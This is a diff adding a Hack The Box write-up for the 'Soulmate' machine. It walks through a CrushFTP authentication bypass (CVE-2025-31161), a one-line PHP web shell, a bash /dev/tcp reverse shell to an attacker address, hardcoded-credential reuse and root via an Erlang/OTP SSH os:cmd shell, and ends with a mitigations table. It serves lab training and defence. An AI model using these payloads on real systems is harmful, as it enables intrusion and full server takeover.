@@ -1,0 +1,99 @@
+HTB — Soulmate
+OS	Difficulty	Role	Platform
+Linux	Easy	Web → user → root	Hack The Box
+Skills demonstrated: vhost discovery, CrushFTP authentication-bypass exploitation, web-shell upload via VFS, credential hunting, abuse of an over-privileged Erlang/OTP SSH service.
+
+Summary:
+
+Soulmate runs a PHP dating site on soulmate.htb and a CrushFTP instance on the ftp.soulmate.htb vhost (HTTP, port 80). 
+CrushFTP is vulnerable to the CVE-2025-31161 authentication bypass, which creates an admin account. 
+Through the admin VFS, a PHP web shell is written into the share that backs the main site's web root, giving code execution as www-data. 
+An Erlang startup script on disk holds hardcoded credentials for user ben. ben can reach an Erlang/OTP SSH daemon bound to localhost:2222 that runs as root; its Erlang shell exposes os:cmd/1, which runs commands as root.
+
+Attack chain:
+Foothold: CVE-2025-31161 on CrushFTP → create admin → PHP web shell → www-data
+User: hardcoded ben credentials in an Erlang startup script
+Root: ben → Erlang/OTP SSH on localhost:2222 (running as root) → os:cmd/1
+
+1. Enumeration:
+bash
+nmap -sC -sV -A -oN nmap/initial 10.10.11.X        # 22 (SSH), 80 (HTTP)
+echo "10.10.11.X soulmate.htb ftp.soulmate.htb" | sudo tee -a /etc/hosts
+
+ffuf -u http://10.10.11.X -H "Host: FUZZ.soulmate.htb" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+# ftp.soulmate.htb -> CrushFTP web interface (v11.x)
+
+soulmate.htb is a PHP dating app with little attack surface; ftp.soulmate.htb serves CrushFTP over HTTP on port 80 (not the FTP protocol — an FTP client here returns 421/530, which is a protocol mismatch, not auth failure; use a browser or HTTP tooling).
+
+2. Foothold — CVE-2025-31161 (CrushFTP auth bypass):
+As of 2026-11-22, per Outpost24 and NVD: CVE-2025-31161 is a critical (CVSS 9.8) authentication bypass in CrushFTP's HTTP component, in the handling of the AWS4-HMAC-SHA256 authorization header, affecting CrushFTP 10.0.0–10.8.3 and 11.0.0–11.3.0.
+The bypass lets an unauthenticated attacker act as an existing account (e.g. crushadmin) and create a new admin user.
+The draft noted "earlier rejected ID CVE-2025-2825." That's accurate: the flaw was briefly circulated as CVE-2025-2825 after a disclosure mix-up, and is now tracked as CVE-2025-31161. Cite CVE-2025-31161.
+
+bash
+python3 cve-2025-31161.py \
+  --target_host ftp.soulmate.htb --port 80 \
+  --target_user crushadmin \
+  --new_user hacker --password <password>
+
+Log into the CrushFTP web interface as the new admin user.
+
+3. Web shell → www-data:
+
+CrushFTP's admin UI maps shares through its VFS. Grant the new user write access to the share that backs the main site's document root (here /webProd/, served by the soulmate.htb vhost), then upload a PHP shell into it:
+bash
+# upload shell.php into the web-root-backed share, then:
+curl "http://soulmate.htb/shell.php"      # executes as www-data
+Writing into the CrushFTP-managed share is what turns file access into code execution on the PHP site — the share and the web root are the same directory.
+A minimal shell is easier to debug than the reverse-shell loop:
+
+php
+<?php system($_GET['c']); ?>
+
+Then upgrade to an interactive reverse shell (bash -i >& /dev/tcp/<ip>/<port> 0>&1) and stabilize with python3 -c 'import pty; pty.spawn("/bin/bash")'.
+
+4. User — hardcoded credentials:
+bash
+cat /usr/local/lib/erlang_login/start.escript
+# ... hardcoded credentials for user 'ben' ...
+bash
+su ben           # or: ssh ben@10.10.11.X
+cat ~/user.txt
+
+5. Root — Erlang/OTP SSH on localhost:2222
+
+A root-owned Erlang/OTP SSH daemon listens on 127.0.0.1:2222. As ben, connect to it:
+
+bash
+ssh ben@localhost -p 2222
+
+This drops into an Erlang shell. Because the daemon runs as root, os:cmd/1 executes commands as root:
+
+erlang
+1> os:cmd("id").
+"uid=0(root) gid=0(root) groups=0(root)\n"
+2> os:cmd("cat /root/root.txt").
+
+Unauthenticated alternative (not needed here): CVE-2025-32433, a critical (CVSS 10.0) pre-auth RCE in the Erlang/OTP SSH server (fixed in OTP-27.3.3 / 26.2.5.11 / 25.3.2.20), reaches the same daemon without credentials. 
+The authenticated os:cmd path above is simpler once ben is known.
+
+Root cause and mitigations:
+Layer	Issue	Fix
+CrushFTP	Auth bypass, CVE-2025-31161	Upgrade to a patched CrushFTP (≥ 11.3.1); restrict admin UI exposure
+Web root	Upload share mapped to a PHP-executing web root	Don't map writable file shares into a directory served as executable code; disable PHP execution in upload paths
+Credentials	Hardcoded ben creds in an on-disk Erlang script	Remove secrets from scripts; use a secrets store; rotate exposed credentials
+Erlang SSH	Management daemon runs as root with a full os:cmd shell	Run the service unprivileged; disable the interactive shell / restrict os:cmd; patch CVE-2025-32433
+
+Key lessons:
+An HTTP port serving a file-transfer product is not an FTP service; 421/530 there are protocol mismatches, not credentials problems.
+A writable share that overlaps the web root converts file access into code execution.
+A management daemon (here Erlang/OTP SSH) running as root is a direct privesc if it exposes a command primitive like os:cmd/1.
+
+References:
+Outpost24 — CrushFTP auth bypass (CVE-2025-31161)
+NVD — CVE-2025-31161
+Erlang/OTP advisory — CVE-2025-32433 (GHSA-37cp-fgq5-7wc2)
+NVD — CVE-2025-32433
+
+Performed against a Hack The Box machine for educational purposes.
